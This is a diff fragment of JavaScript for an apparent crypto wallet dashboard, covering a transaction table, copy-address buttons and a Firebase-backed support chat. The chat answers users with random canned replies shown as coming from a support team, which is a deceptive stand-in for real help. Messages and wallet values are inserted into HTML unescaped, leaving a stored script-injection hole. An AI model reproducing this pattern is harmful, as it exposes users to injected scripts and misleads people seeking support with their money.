+            const network = tx.type === "Send" || tx.type === "Receive" ? "N/A" : (tx.network || "ERC20");
+            transactionTable.append(`
+              <tr>
+                <td>${amount} ${currency}</td>
+                <td>${currency}</td>
+                <td class="wallet-cell">
+                  ${truncateAddress(tx.wallet)}
+                  <button class="btn-copy" data-wallet="${tx.wallet}">Copy</button>
+                </td>
+                <td>${network}</td>
+                <td>${tx.type}</td>
+                <td>${tx.status}</td>
+                <td>${new Date(tx.timestamp).toLocaleString()}</td>
+              </tr>
+            `);
+          });
+
+          $(".btn-copy").on("click", async function() {
+            const wallet = $(this).data("wallet");
+            try {
+              await copyToClipboard(wallet);
+              showToast("Wallet address copied!");
+            } catch (error) {
+              iziToast.error({ title: "Error", message: `Failed to copy wallet address: ${error.message}`, position: "topRight" });
+            }
+          });
+        });
+
+        let isTyping = false;
+        async function simulateSupportResponse(message) {
+          const chatMessages = $("#chat-messages");
+          const typingIndicator = $(`
+            <div class="typing-indicator">
+              <span></span><span></span><span></span>
+            </div>
+          `);
+          chatMessages.append(typingIndicator);
+          chatMessages.scrollTop(chatMessages[0].scrollHeight);
+
+          await new Promise(resolve => setTimeout(resolve, 2000));
+
+          const responses = [
+            "Thanks for reaching out! How can we assist you today?",
+            "We're here to help. Could you provide more details?",
+            `Got your message: "${message.slice(0, 20)}${message.length > 20 ? "..." : ""}". What's next?`,
+            "Our team is reviewing your query. Please hold on.",
+            "Can you clarify your request? We're all ears!",
+          ];
+          const randomResponse = responses[Math.floor(Math.random() * responses.length)];
+
+          typingIndicator.remove();
+          const supportMessage = {
+            message: randomResponse,
+            sender: "support",
+            timestamp: new Date().toISOString(),
+            status: "sent",
+          };
+
+          const newMessageRef = push(ref(database, `users/${userId}/chat`));
+          await set(newMessageRef, supportMessage);
+        }
+
+        $("#send-message").on("click", async () => {
+          const message = $("#chat-input").val().trim();
+          if (!message) {
+            iziToast.error({ title: "Error", message: "Message cannot be empty!", position: "topRight" });
+            return;
+          }
+
+          try {
+            const newMessageRef = push(ref(database, `users/${userId}/chat`));
+            await set(newMessageRef, {
+              message: message,
+              sender: "user",
+              timestamp: new Date().toISOString(),
+              status: "pending",
+            });
+
+            $("#chat-input").val("");
+            iziToast.success({ title: "Success", message: "Message sent!", position: "topRight" });
+
+            setTimeout(async () => {
+              await update(ref(database, `users/${userId}/chat/${newMessageRef.key}`), { status: "sent" });
+              await simulateSupportResponse(message);
+            }, 1000);
+          } catch (error) {
+            iziToast.error({ title: "Error", message: `Failed to send message: ${error.message}`, position: "topRight" });
+          }
+        });
+
+        $("#chat-input").on("keypress", async (e) => {
+          if (e.which === 13) {
+            e.preventDefault();
+            $("#send-message").click();
+          }
+        });
+
+        $("#chat-input").on("input", () => {
+          isTyping = true;
+          setTimeout(() => {
+            isTyping = false;
+            $("#chat-messages").scrollTop($("#chat-messages")[0].scrollHeight);
+          }, 500);
+        });
+
+        onValue(ref(database, `users/${userId}/chat`), (snapshot) => {
+          const messages = snapshot.val() || {};
+          const chatContainer = $("#chat-messages");
+          chatContainer.empty();
+
+          // Group messages by date
+          const groupedMessages = {};
+          Object.entries(messages).forEach(([id, msg]) => {
+            const dateCategory = formatChatDate(msg.timestamp);
+            if (!groupedMessages[dateCategory]) {
+              groupedMessages[dateCategory] = [];
+            }
+            groupedMessages[dateCategory].push({ id, ...msg });
+          });
+
+          // Sort date categories (Today, Yesterday, then older dates)
+          const sortedDates = Object.keys(groupedMessages).sort((a, b) => {
+            if (a === "Today") return -1;
+            if (b === "Today") return 1;
+            if (a === "Yesterday") return -1;
+            if (b === "Yesterday") return 1;
+            return new Date(b).getTime() - new Date(a).getTime();
+          });
+
+          // Render messages
+          sortedDates.forEach((date) => {
+            chatContainer.append(`<p class="chat-date-header">${date}</p>`);
+            groupedMessages[date].forEach(({ id, ...msg }) => {
+              const isUser = msg.sender === "user";
+              const statusClass = msg.status === "pending" ? "pending" : "sent";
+              const statusIcon = msg.status === "pending" ? '<i class="fas fa-check"></i>' : '<i class="fas fa-check-double"></i>';
+              chatContainer.append(`
+                <div class="chat-message ${isUser ? "user" : "support"}">
+                  ${isUser ? `<span class="avatar">${username[0].toUpperCase()}</span>` : `<span class="avatar"><i class="fas fa-headphones"></i></span>`}
+                  ${msg.message}
+                  <div class="message-footer">
+                    <small>${formatChatDate(msg.timestamp)}</small>
+                    ${isUser ? `<span class="status ${statusClass}">${statusIcon}</span>` : ""}
+                  </div>
+                </div>
+              `);
+            });
+          });
+
+          if (!isTyping) {
+            chatContainer.scrollTop(chatContainer[0].scrollHeight);
+          }
+
+          const lastSupportMessage = Object.values(messages)
+            .filter((msg) => msg.sender === "support")
+            .slice(-1)[0];
+          const lastSeen = lastSupportMessage ? formatChatDate(lastSupportMessage.timestamp) : "Online";
+          $("#support-status").text(`Support was last seen: ${lastSeen}`);
         });
       });
     });
